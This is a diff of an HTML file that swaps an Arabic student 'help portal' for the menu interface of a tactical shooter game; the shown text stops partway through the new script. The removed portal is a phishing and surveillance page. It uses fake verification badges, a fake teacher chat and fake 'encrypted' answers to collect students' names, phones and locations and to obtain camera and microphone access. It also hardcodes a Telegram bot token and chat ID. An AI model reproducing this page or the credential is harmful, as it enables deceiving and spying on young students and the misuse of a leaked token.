@@ -3,374 +3,634 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>منصة أسألني | بوابة الطالب الموحدة</title>
+    <title>المواجهة التكتيكية | Tactical Warfare Pro</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --p: #0f172a; --a: #1d9bf0; --g: #f59e0b; --s: #f1f5f9; --w: #ffffff; --verify: #1d9bf0; --r: #ef4444; --ok: #22c55e; }
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
-        body { background: var(--s); font-family: 'Cairo', sans-serif; margin: 0; padding-bottom: 100px; overflow-x: hidden; }
+        /* 1. المظهر البصري والألوان (Realistic Visual Style) */
+        :root {
+            --bg-matte-black: #0b0c0e;
+            --cool-grey-dark: #1a1c1e;
+            --cool-grey-light: #2c2f33;
+            --military-olive: #3b4234;
+            --military-olive-hover: #4c5543;
+            --steel-blue: #1e293b;
+            --text-pure: #f8fafc;
+            --gold-coins: #d97706;
+            --gems-cash: #06b6d4;
+        }
 
-        .verified-badge { color: var(--verify); font-size: 14px; margin-inline: 4px; }
-        
-        #gate { position: fixed; inset: 0; background: radial-gradient(circle at top, #1e293b, #0f172a); z-index: 10000; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .login-card { background: var(--w); padding: 45px 30px; border-radius: 40px; width: 100%; max-width: 450px; text-align: center; box-shadow: 0 40px 80px rgba(0,0,0,0.5); }
-        
-        header { background: var(--p); color: var(--w); padding: 15px 20px; position: fixed; top: 0; width: 100%; z-index: 1000; display: none; justify-content: space-between; align-items: center; border-bottom: 4px solid var(--a); }
-        .logo-area { font-weight: 900; font-size: 22px; display: flex; align-items: center; }
+        * {
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            font-family: 'Cairo', sans-serif;
+            margin: 0;
+            padding: 0;
+        }
 
-        #side-support-btn { position: fixed; bottom: 120px; left: 20px; z-index: 999; display: none; flex-direction: column; align-items: center; }
-        .pulse-btn { width: 70px; height: 70px; background: var(--a); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 30px; cursor: pointer; border: 4px solid #fff; box-shadow: 0 0 20px rgba(29, 155, 240, 0.6); animation: pulse-ring 1.5s infinite; }
-        @keyframes pulse-ring { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
-        
-        .support-notif { background: var(--r); color: #fff; padding: 5px 12px; border-radius: 15px; font-size: 11px; font-weight: bold; position: absolute; top: -10px; right: -5px; animation: bounce 2s infinite; }
-        .hand-pointer { width: 40px; position: absolute; left: 60px; top: 20px; animation: point-move 1.5s infinite; }
-        @keyframes point-move { 0%, 100% { transform: translateX(0); } 50% { transform: translateX(10px); } }
+        body {
+            background-color: var(--bg-matte-black);
+            color: var(--text-pure);
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
 
-        #pre-chat-menu { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 25000; align-items: center; justify-content: center; padding: 20px; }
-        .menu-card { background: #fff; border-radius: 30px; width: 100%; max-width: 400px; padding: 25px; text-align: center; }
+        /* حاوية اللعبة الرئيسية */
+        .game-viewport {
+            position: relative;
+            width: 100vw;
+            height: 100vh;
+            background-color: #000;
+        }
 
-        .card { background: var(--w); border-radius: 35px; padding: 25px; margin: 15px; border: 1px solid #e2e8f0; box-shadow: 0 15px 30px rgba(0,0,0,0.05); }
-        #cam-loader { display: none; text-align: center; padding: 20px; }
-        .sync-spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--a); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
+        /* 3D Cinematic Canvas */
+        #renderCanvas {
+            position: absolute;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
 
-        .cam-box { width: 100%; height: 380px; border-radius: 30px; overflow: hidden; background: #000; position: relative; display: none; margin: 15px 0; border: 8px solid var(--w); }
-        #v-stream { width: 100%; height: 100%; object-fit: cover; }
-        
-        .mic-area { margin: 25px 0; text-align: center; }
-        .mic-btn { width: 85px; height: 85px; border-radius: 50%; background: var(--ok); border: none; color: #fff; font-size: 30px; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; transition: 0.3s; box-shadow: 0 10px 25px rgba(34, 197, 94, 0.3); }
-        .mic-btn.active { background: var(--r); animation: pulse 1s infinite; }
+        /* واجهة المستخدم الفوقية */
+        .ui-overlay {
+            position: absolute;
+            inset: 0;
+            z-index: 10;
+            pointer-events: none;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 30px;
+        }
 
-        #custom-alert { position: fixed; top: -150px; left: 50%; transform: translateX(-50%); width: 92%; max-width: 420px; background: #fff; border-radius: 25px; padding: 20px; box-shadow: 0 25px 50px rgba(0,0,0,0.2); z-index: 35000; transition: 0.5s; border-right: 10px solid var(--a); }
-        #custom-alert.show { top: 30px; }
+        .ui-element { pointer-events: auto; }
 
-        .btn-action { background: var(--a); color: var(--w); border: none; padding: 20px; border-radius: 22px; width: 100%; font-weight: 900; cursor: pointer; margin-top: 15px; font-size: 18px; }
-        input, select, textarea { width: 100%; padding: 18px; margin: 10px 0; border: 2px solid #f1f5f9; border-radius: 20px; font-family: 'Cairo'; font-size: 15px; }
+        /* شريط العملات والموارد */
+        .top-currency-bar {
+            display: flex;
+            gap: 20px;
+            align-self: flex-start;
+        }
 
-        nav { position: fixed; bottom: 0; width: 100%; background: #fff; display: none; justify-content: space-around; padding: 15px 0; border-top: 2px solid #eee; z-index: 900; }
-        .nav-link { text-align: center; font-size: 12px; color: #94a3b8; flex: 1; text-decoration: none; font-weight: 700; cursor: pointer; }
-        .nav-link.active { color: var(--a); }
-        .nav-link i { font-size: 24px; display: block; margin-bottom: 5px; }
+        .currency-box {
+            background: rgba(26, 28, 30, 0.85);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 8px 20px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 900;
+            font-size: 16px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
 
-        #support-window { display: none; position: fixed; inset: 0; background: #fff; z-index: 30000; flex-direction: column; }
-        .chat-msg { padding: 12px; border-radius: 18px; max-width: 85%; font-size: 14px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); margin: 5px 0; }
-        .msg-bot { background: #fff; align-self: flex-start; border-bottom-left-radius: 5px; }
-        .msg-user { background: #dcf8c6; align-self: flex-end; border-bottom-right-radius: 5px; }
+        .coin-txt { color: var(--gold-coins); }
+        .gem-txt { color: var(--gems-cash); }
 
-        .locked-content { background: #e2e8f0; border-radius: 20px; padding: 20px; text-align: center; color: #64748b; border: 2px dashed #cbd5e1; cursor: pointer; margin: 10px 0; position: relative; overflow: hidden; }
-        .locked-content i { font-size: 30px; display: block; margin-bottom: 10px; color: var(--a); }
-        .locked-content::after { content: "محتوى مشفر"; position: absolute; top: 5px; left: 5px; font-size: 10px; background: var(--a); color: #fff; padding: 2px 8px; border-radius: 10px; }
+        /* القائمة الرئيسية الجانبية */
+        .main-menu-panel {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            width: 320px;
+            background: linear-gradient(90deg, rgba(11, 12, 14, 0.95), rgba(11, 12, 14, 0.4));
+            height: auto;
+            padding: 40px;
+            position: absolute;
+            right: 0;
+            top: 15%;
+            bottom: 15%;
+            justify-content: center;
+            border-right: 4px solid var(--military-olive);
+        }
+
+        /* تصميم الأزرار التكتيكية الاحترافية */
+        .tactic-btn {
+            background: var(--cool-grey-dark);
+            color: var(--text-pure);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            padding: 16px 25px;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.8);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+        }
+
+        .tactic-btn::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.08), transparent);
+            transition: 0.5s;
+        }
+
+        .tactic-btn:hover::before { left: 100%; }
+
+        .tactic-btn:hover {
+            background: var(--cool-grey-light);
+            transform: translateX(-5px);
+            border-color: rgba(255,255,255,0.3);
+        }
+
+        .tactic-btn.primary-btn {
+            background: var(--military-olive);
+            border-color: rgba(255, 255, 255, 0.2);
+            font-weight: 900;
+            font-size: 20px;
+            box-shadow: 0 0 20px rgba(59, 66, 52, 0.4);
+        }
+
+        .tactic-btn.primary-btn:hover {
+            background: var(--military-olive-hover);
+            box-shadow: 0 0 30px rgba(59, 66, 52, 0.6);
+        }
+
+        /* النوافذ الفرعية (Modals) */
+        .tactic-modal {
+            position: absolute;
+            inset: 0;
+            background: rgba(11, 12, 14, 0.92);
+            backdrop-filter: blur(15px);
+            z-index: 100;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            padding: 40px;
+        }
+
+        .modal-content {
+            background: var(--cool-grey-dark);
+            border: 2px solid var(--cool-grey-light);
+            width: 100%;
+            max-width: 800px;
+            border-radius: 20px;
+            padding: 35px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
+            position: relative;
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid var(--cool-grey-light);
+            padding-bottom: 15px;
+            margin-bottom: 25px;
+        }
+
+        .modal-title { font-size: 24px; font-weight: 900; color: var(--text-pure); }
+        .close-modal-btn { background: none; border: none; color: #64748b; font-size: 24px; cursor: pointer; }
+        .close-modal-btn:hover { color: var(--text-pure); }
+
+        /* شبكة عرض الأسلحة والمتجر */
+        .item-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        .item-card {
+            background: var(--cool-grey-light);
+            border: 1px solid rgba(255,255,255,0.05);
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            transition: 0.2s;
+        }
+
+        .item-card:hover { transform: translateY(-5px); border-color: var(--military-olive); }
+        .item-preview { height: 100px; display: flex; align-items: center; justify-content: center; font-size: 50px; color: #94a3b8; margin-bottom: 15px; }
+        .item-name { font-weight: 700; font-size: 16px; margin-bottom: 10px; }
+        .item-price { font-size: 14px; font-weight: 900; color: var(--gold-coins); margin-bottom: 15px; }
+
+        /* أنيميشن تفتيح الباكدجات السينمائي */
+        .crate-opening-zone {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 300px;
+        }
+
+        .tactical-crate-box {
+            font-size: 100px;
+            color: var(--military-olive);
+            cursor: pointer;
+            transition: 0.3s;
+            animation: crate-idle 3s infinite ease-in-out;
+        }
+
+        @keyframes crate-idle {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-10px) rotate(2deg); }
+        }
+
+        .crate-shake { animation: crate-shake-anim 0.1s infinite; }
+        @keyframes crate-shake-anim {
+            0% { transform: translate(2px, 1px) rotate(0deg); }
+            10% { transform: translate(-1px, -2px) rotate(-1deg); }
+            20% { transform: translate(-3px, 0px) rotate(1deg); }
+            30% { transform: translate(0px, 2px) rotate(0deg); }
+            40% { transform: translate(1px, -1px) rotate(1deg); }
+            50% { transform: translate(-1px, 2px) rotate(-1deg); }
+            60% { transform: translate(-3px, 1px) rotate(0deg); }
+            70% { transform: translate(2px, 1px) rotate(-1deg); }
+            80% { transform: translate(-1px, -1px) rotate(1deg); }
+            90% { transform: translate(2px, 2px) rotate(0deg); }
+            100% { transform: translate(1px, -2px) rotate(-1deg); }
+        }
+
+        /* شاشة نهاية المباراة التكتيكية */
+        .match-end-screen {
+            position: absolute;
+            inset: 0;
+            background: rgba(0,0,0,0.95);
+            z-index: 500;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+
+        .result-title { font-size: 80px; font-weight: 900; letter-spacing: 4px; margin-bottom: 20px; text-shadow: 0 0 40px rgba(255,255,255,0.2); }
+        .result-title.victory { color: #22c55e; text-shadow: 0 0 50px rgba(34, 197, 94, 0.4); }
+        .result-title.defeat { color: #ef4444; text-shadow: 0 0 50px rgba(239, 68, 68, 0.4); }
+
+        .reward-summary { background: var(--cool-grey-dark); padding: 30px; border-radius: 16px; border: 1px solid var(--cool-grey-light); min-width: 350px; }
+        .reward-row { display: flex; justify-content: space-between; margin: 15px 0; font-size: 18px; font-weight: 700; }
+
+        /* واجهة اللعب الحية */
+        #game-play-ui { display: none; position: absolute; bottom: 40px; left: 50%; transform: translateX(-50%); z-index: 20; width: 90%; max-width: 600px; display: none; justify-content: space-between; pointer-events: none; }
+        .crosshair { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 10px; height: 10px; border: 2px solid rgba(255,255,255,0.6); border-radius: 50%; pointer-events: none; z-index: 15; display: none; }
     </style>
 </head>
 <body>
 
-    <div id="custom-alert">
-        <div style="display:flex; align-items:center; gap:10px;">
-            <i class="fa-solid fa-circle-check verified-badge" style="font-size:20px"></i>
-            <b style="font-size:15px">تنبيه النظام الموثق</b>
-        </div>
-        <div id="alert-text" style="font-size:14px; color:#475569; margin-top:8px; line-height:1.6"></div>
-    </div>
+    <div class="game-viewport">
+        <!-- 3D Environment Simulated Engine Canvas -->
+        <canvas id="renderCanvas"></canvas>
+        <div class="crosshair" id="hud-crosshair"></div>
 
-    <div id="gate">
-        <div class="login-card">
-            <i class="fa-solid fa-user-graduate" style="color:var(--a); font-size: 65px; margin-bottom: 15px;"></i>
-            <h2 style="margin:0; font-weight:900">منصة أسألني <i class="fa-solid fa-circle-check verified-badge"></i></h2>
-            <p style="font-size: 13px; color: #64748b; margin-bottom:25px">بوابة الطالب الموحدة | دخول آمن</p>
-            <input type="text" id="stu_name" placeholder="الاسم الثلاثي للطالب">
-            <input type="number" id="stu_phone" placeholder="رقم الهاتف المسجل">
-            <select id="stu_grade">
-                <option value="" disabled selected>اختر المرحلة الدراسية</option>
-                <option>الأول الثانوي</option><option>الثاني الثانوي</option><option>الثالث الثانوي</option>
-            </select>
-            <button class="btn-action" onclick="collectDeviceData()">دخول للنظام <i class="fa-solid fa-shield-halved"></i></button>
-        </div>
-    </div>
-
-    <div id="side-support-btn" onclick="openPreMenu()">
-        <span class="support-notif">1</span>
-        <div class="pulse-btn"><i class="fa-solid fa-headset"></i></div>
-        <img src="https://i.ibb.co/v4msh8Z/hand-pointer.png" class="hand-pointer" alt="اضغط هنا">
-    </div>
-
-    <div id="pre-chat-menu">
-        <div class="menu-card">
-            <h3 style="margin:0">مركز الاستفسارات <i class="fa-solid fa-circle-check verified-badge"></i></h3>
-            <p style="font-size:13px; color:#64748b">تواصل مع المعلمين من محافظتك فوراً</p>
-            <select id="user-gov">
-                <option value="" disabled selected>اختر محافظتك الآن</option>
-                <option>القاهرة</option><option>الجيزة</option><option>الإسكندرية</option><option>الدقهلية</option><option>البحر الأحمر</option><option>البحيرة</option><option>الفيوم</option><option>الغربية</option><option>الإسماعيلية</option><option>المنوفية</option><option>المنيا</option><option>القليوبية</option><option>الوادي الجديد</option><option>السويس</option><option>اسوان</option><option>اسيوط</option><option>بني سويف</option><option>بورسعيد</option><option>دمياط</option><option>الشرقية</option><option>جنوب سيناء</option><option>كفر الشيخ</option><option>مطروح</option><option>الأقصر</option><option>قنا</option><option>شمال سيناء</option><option>سوهاج</option>
-            </select>
-            <button class="btn-action" style="background:#25d366;" onclick="startTeacherChat()">
-                <i class="fa-brands fa-whatsapp"></i> تفعيل الدردشة مع معلمي
-            </button>
-            <button onclick="document.getElementById('pre-chat-menu').style.display='none'" style="background:none; border:none; color:#94a3b8; margin-top:15px; font-weight:bold; cursor:pointer;">إغلاق</button>
-        </div>
-    </div>
-
-    <div id="support-window">
-        <div style="background:var(--p); color:#fff; padding:15px; display:flex; align-items:center; gap:12px; border-bottom:3px solid var(--a);">
-            <i class="fa-solid fa-chevron-right" onclick="toggleSupport(false)" style="font-size:20px;"></i>
-            <div style="position:relative;">
-                <img id="t-avatar" src="https://ui-avatars.com/api/?name=Teacher&background=1d9bf0&color=fff" style="width:45px; height:45px; border-radius:50%;">
-                <div style="position:absolute; bottom:0; right:0; width:12px; height:12px; background:var(--ok); border:2px solid #fff; border-radius:50%;"></div>
-            </div>
-            <div>
-                <div id="t-name" style="font-weight:900; font-size:15px;">المعلم الموثق</div>
-                <div id="t-loc" style="font-size:10px; color:#cbd5e1;">متصل الآن</div>
-            </div>
-        </div>
-        <div id="chat-body" style="flex:1; padding:15px; overflow-y:auto; background:#f0f2f5; display:flex; flex-direction:column;">
-            <div id="chat-start-area" style="text-align:center; padding:50px 20px;">
-                <i class="fa-brands fa-whatsapp" style="font-size:60px; color:#25d366; margin-bottom:15px;"></i>
-                <button class="btn-action" style="width:auto; padding:15px 50px;" onclick="handleStartChat()">بدء المحادثة</button>
-            </div>
-        </div>
-        <div id="chat-footer" style="padding:15px; background:#fff; display:none; gap:10px; align-items:center; border-top:1px solid #eee;">
-            <i class="fa-solid fa-camera" onclick="requestMediaPermission()" style="font-size:22px; color:var(--a); cursor:pointer;"></i>
-            <input type="text" id="chat-input" placeholder="اكتب رسالتك..." style="margin:0; flex:1;">
-            <button onclick="handleFakeChat()" style="background:var(--a); color:#fff; border:none; width:50px; height:50px; border-radius:50%; font-size:20px;">
-                <i class="fa-solid fa-paper-plane"></i>
-            </button>
-        </div>
-    </div>
-
-    <header id="h-main">
-        <div class="logo-area">أسألني <i class="fa-solid fa-circle-check verified-badge"></i></div>
-        <div id="u-tag" style="background:var(--g); width:45px; height:45px; border-radius:15px; display:flex; align-items:center; justify-content:center; font-weight:900"></div>
-    </header>
-
-    <div id="sec-home" class="page" style="padding-top:100px; display:none">
-        <div class="card">
-            <h3 style="margin:0">رفع سؤال جديد <i class="fa-solid fa-camera-retro" style="color:var(--a); margin-inline:8px"></i></h3>
-            <select id="stu_subject">
-                <option>لغة عربية</option><option>لغة إنجليزية</option><option>كيمياء</option><option>فيزياء</option>
-            </select>
-            <div id="cam-loader"><div class="sync-spinner"></div><p style="font-weight:bold; color:var(--a)">جاري تأمين الكاميرا...</p></div>
-            <div id="cam-ui" class="cam-box"><video id="v-stream" autoplay playsinline muted></video></div>
-            <button id="main-trigger" class="btn-action" style="background:var(--g); color:#000" onclick="handleCameraPermission()">تفعيل الكاميرا وتصوير السؤال <i class="fa-solid fa-camera"></i></button>
-            <div id="upload-ui" style="display:none">
-                <textarea id="stu-note" placeholder="ملاحظة للمعلم..." rows="2"></textarea>
-                <div class="mic-area">
-                    <button id="mic-trigger" class="mic-btn" onclick="handleMicPermission()"><i class="fa-solid fa-microphone"></i></button>
-                    <p id="mic-status" style="font-size:13px; color:var(--ok); margin-top:10px; font-weight:900">اضغط لتفعيل المايك</p>
+        <!-- الطبقة العلوية للواجهات (UI Overlay) -->
+        <div class="ui-overlay" id="main-hud-layer">
+            
+            <!-- 2. عدادات العملات الفوقية -->
+            <div class="top-currency-bar ui-element">
+                <div class="currency-box">
+                    <i class="fa-solid fa-coins" style="color: var(--gold-coins);"></i>
+                    <span id="player-gold-display" class="coin-txt">10,000</span>
                 </div>
-                <button class="btn-action" onclick="finalSubmit()">إرسال للمراجعة الموثقة <i class="fa-solid fa-paper-plane"></i></button>
-            </div>
-        </div>
-    </div>
-
-    <div id="sec-logs" class="page" style="padding-top:100px; display:none">
-        <div class="card">
-            <h3 style="margin:0">سجل الإجابات الموثقة <i class="fa-solid fa-shield-check" style="color:var(--verify)"></i></h3>
-            <div id="encrypted-area">
-                <div class="locked-content" onclick="showPrivacyLock()">
-                    <i class="fa-solid fa-file-image"></i> صورة السؤال المصور (مراجعة 1)
+                <div class="currency-box">
+                    <i class="fa-solid fa-gem" style="color: var(--gems-cash);"></i>
+                    <span id="player-gems-display" class="gem-txt">250</span>
                 </div>
-                <div class="locked-content" onclick="showPrivacyLock()">
-                    <i class="fa-solid fa-microphone-lines"></i> تسجيل صوتي للمعلم (شرح الإجابة)
-                </div>
-                <div class="locked-content" onclick="showPrivacyLock()">
-                    <i class="fa-solid fa-file-pdf"></i> ملف PDF موثق (ملخص الحصة)
+                <div class="currency-box" style="color: #94a3b8;">
+                    <i class="fa-solid fa-shield-halved"></i>
+                    <span id="player-xp-display">XP: 0</span>
                 </div>
             </div>
-            <p style="font-size: 11px; color: #94a3b8; text-align: center; margin-top: 15px;">يتم تشفير المحتوى تلقائياً لحماية خصوصية حسابك.</p>
+
+            <!-- القائمة الرئيسية الاحترافية -->
+            <div class="main-menu-panel ui-element" id="primary-menu">
+                <button class="tactic-btn primary-btn" onclick="triggerMatchmaking()">
+                    <i class="fa-solid fa-gun"></i> بدء المعركة (PLAY)
+                </button>
+                <button class="tactic-btn" onclick="openModal('armory-modal')">
+                    <i class="fa-solid fa-screwdriver-wrench"></i> الترسانة / الأسلحة
+                </button>
+                <button class="tactic-btn" onclick="openModal('store-modal')">
+                    <i class="fa-solid fa-boxes-stacked"></i> المتجر والباكدجات
+                </button>
+            </div>
+        </div>
+
+        <!-- واجهة الترسانة (Armory) -->
+        <div id="armory-modal" class="tactic-modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <div class="modal-title"><i class="fa-solid fa-gun"></i> ترسانة الأسلحة التكتيكية</div>
+                    <button class="close-modal-btn" onclick="closeModal('armory-modal')">&times;</button>
+                </div>
+                <div class="item-grid">
+                    <div class="item-card">
+                        <div class="item-preview"><i class="fa-solid fa-person-rifle"></i></div>
+                        <div class="item-name">سلاح هجومي تكتيكي M4A1</div>
+                        <div class="item-price">5,000 عملة مجانية</div>
+                        <button class="tactic-btn primary-btn" style="padding:10px; font-size:14px; margin:0 auto;" onclick="buyWeapon('M4A1', 5000)">شراء وتجهيز</button>
+                    </div>
+                    <div class="item-card">
+                        <div class="item-preview" style="color: var(--gems-cash);"><i class="fa-solid fa-crosshairs"></i></div>
+                        <div class="item-name">تمويه غابات رقمي (Skin)</div>
+                        <div class="item-price" style="color: var(--gems-cash);">50 جوهرة مدفوعة</div>
+                        <button class="tactic-btn" style="padding:10px; font-size:14px; margin:0 auto; background: var(--steel-blue);" onclick="buySkin('Digital Wood', 50)">تجهيز المظهر</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- واجهة المتجر والباكدجات (Store & Crates) -->
+        <div id="store-modal" class="tactic-modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <div class="modal-title"><i class="fa-solid fa-box-open"></i> صناديق الإمداد عسكرية</div>
+                    <button class="close-modal-btn" onclick="closeModal('store-modal')">&times;</button>
+                </div>
+                <div class="crate-opening-zone">
+                    <div id="crate-graphic" class="tactical-crate-box" onclick="processCrateOpening()">
+                        <i class="fa-solid fa-box-tissue"></i>
+                    </div>
+                    <p id="crate-status-text" style="margin-top: 20px; font-weight: 700; color: #94a3b8;">اضغط على صندوق الإمدادات لفتحه (التكلفة: 1000 عملة)</p>
+                    <div id="crate-reward-display" style="margin-top: 15px; font-size: 22px; font-weight: 900; display: none;"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 5. شاشة انتهاء الجولة التكتيكية (Match End Screen) -->
+        <div id="match-end-screen" class="match-end-screen">
+            <div id="match-result-title" class="result-title victory">VICTORY</div>
+            <div class="reward-summary">
+                <h3 style="margin-bottom: 15px; border-bottom: 1px solid var(--cool-grey-light); padding-bottom: 5px;">مكافآت انتهاء المهمة</h3>
+                <div class="reward-row">
+                    <span>العملات المكتسبة:</span>
+                    <span id="reward-gold" style="color: var(--gold-coins);">+0</span>
+                </div>
+                <div class="reward-row">
+                    <span>الخبرة المكتسبة (XP):</span>
+                    <span id="reward-xp" style="color: #38bdf8;">+0</span>
+                </div>
+                <button class="tactic-btn primary-btn" style="width:100%; justify-content:center; margin-top:20px;" onclick="returnToMenu()">العودة للمقر الرئيسي</button>
+            </div>
         </div>
     </div>
 
-    <nav id="n-main">
-        <a class="nav-link active" onclick="tab('sec-home', this)"><i class="fa-solid fa-house"></i> الرئيسية</a>
-        <a class="nav-link" onclick="tab('sec-logs', this)"><i class="fa-solid fa-lock"></i> إجاباتك</a>
-    </nav>
-
+    <!-- المحرك الصوتي والبرمجي المتكامل للعبة -->
     <script>
-        const BOT_TOKEN = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
-        const CHAT_ID = "5890070301";
-        let UN = "غير معروف", UP = "لا يوجد", UGOV = "";
-        let activeStream = null;
+        // إعدادات وقاعدة بيانات اللاعب الافتراضية
+        let playerData = {
+            gold: 10000,
+            gems: 250,
+            xp: 0,
+            weapons: ['Default_Pistol'],
+            skins: []
+        };
 
-        const teachers = { "القاهرة": "أ. أحمد خالد", "الجيزة": "أ. محمود زكي", "الإسكندرية": "أ. ياسر علي", "الدقهلية": "أ. إبراهيم عادل", "البحر الأحمر": "أ. سامح فوزي", "البحيرة": "أ. حسن جلال", "الفيوم": "أ. رضا جمال", "الغربية": "أ. طارق نور", "الإسماعيلية": "أ. كريم صفوت", "المنوفية": "أ. سعيد أنور", "المنيا": "أ. أشرف حجازي", "القليوبية": "أ. حمدي نصار", "الوادي الجديد": "أ. شريف بكر", "السويس": "أ. ماجد عمر", "اسوان": "أ. ناصر عز", "اسيوط": "أ. كمال فؤاد", "بني سويف": "أ. جابر عيد", "بورسعيد": "أ. وليد سعيد", "دمياط": "أ. فاروق زين", "الشرقية": "أ. عماد حمدي", "جنوب سيناء": "أ. معتز بالله", "كفر الشيخ": "أ. رفعت عامر", "مطروح": "أ. أسامة حلمي", "الأقصر": "أ. هاني بدري", "قنا": "أ. ربيع قاسم", "شمال سيناء": "أ. أيمن سليمان", "سوهاج": "أ. مدحت صبري" };
-
-        function showSystemMsg(msg) {
-            const box = document.getElementById('custom-alert');
-            document.getElementById('alert-text').innerText = msg;
-            box.classList.add('show');
-            setTimeout(() => box.classList.remove('show'), 4000);
+        // نظام محاكاة الصوت التكتيكي الرنيني والواقعي عبر الترددات البرمجية (Web Audio API)
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        function playTacticalSound(freq, type, duration) {
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = type;
+            osc.frequency.value = freq;
+            gain.gain.setValueAtTime(0.15, audioCtx.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration);
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            osc.start();
+            osc.stop(audioCtx.currentTime + duration);
         }
 
-        function showPrivacyLock() {
-            showSystemMsg("عفواً، لا يمكن عرض المحتوى المشفر حالياً حفاظاً على خصوصية بياناتك في المنصة. سيتم الفتح فور انتهاء المعلم من المراجعة.");
+        // إعدادات السينما الرادارية (Canvas Engine Dynamic Rendering)
+        const canvas = document.getElementById('renderCanvas');
+        const ctx = canvas.getContext('2d');
+        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+        window.addEventListener('resize', resizeCanvas);
+        resizeCanvas();
+
+        // 4. حركة الشخصية والفيزيائيات الواقعية (Advanced Locomotion Matrix)
+        let playerSim = {
+            x: window.innerWidth / 2,
+            y: window.innerHeight / 2,
+            targetX: window.innerWidth / 2,
+            inertiaX: 0,
+            weaponJog: 0,
+            jogDir: 1,
+            isMatchPlaying: false,
+            cameraShake: 0
+        };
+
+        // حلقة الرسم ثلاثية الأبعاد التكتيكية بمعدل 60 إطار في الثانية
+        function renderLoop() {
+            ctx.fillStyle = '#0b0c0e'; // لون أسود مطفي مطور
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            // تفعيل تأثير الغبار المتطاير في الهواء المحاكي للبيئة (Atmospheric Dust Effect)
+            ctx.fillStyle = 'rgba(255, 255, 255, 0.03)';
+            for(let i=0; i<15; i++) {
+                let dx = (Math.sin(Date.now() * 0.001 + i) * canvas.width/2) + canvas.width/2;
+                let dy = ((Date.now() * 0.05 + i * 100) % canvas.height);
+                ctx.beginPath();
+                ctx.arc(dx, dy, 2, 0, Math.PI * 2);
+                ctx.fill();
+            }
+
+            if (playerSim.isMatchPlaying) {
+                // محاكاة القصور الذاتي التكتيكي عند التحرك المفاجئ (Inertia Matrix)
+                let diffX = playerSim.targetX - playerSim.x;
+                playerSim.inertiaX += diffX * 0.01;
+                playerSim.inertiaX *= 0.85; // امتصاص التوازن التدريجي
+                playerSim.x += playerSim.inertiaX;
+
+                // محاكاة حركة اهتزاز السلاح الواقعية مع حركة الكتف (Weapon Jogging)
+                playerSim.weaponJog += 0.1 * playerSim.jogDir;
+                if(Math.abs(playerSim.weaponJog) > 5) playerSim.jogDir *= -1;
+
+                // رسم تمثيلي تكتيكي للسلاح مائل مع الحركة الهندسية للكاميرا
+                ctx.save();
+                // نظام محاكاة اهتزاز كاميرا الخوذة (Camera Shake System)
+                if(playerSim.cameraShake > 0) {
+                    ctx.translate((Math.random()-0.5)*playerSim.cameraShake, (Math.random()-0.5)*playerSim.cameraShake);
+                    playerSim.cameraShake *= 0.9;
+                }
+                ctx.fillStyle = '#1e293b';
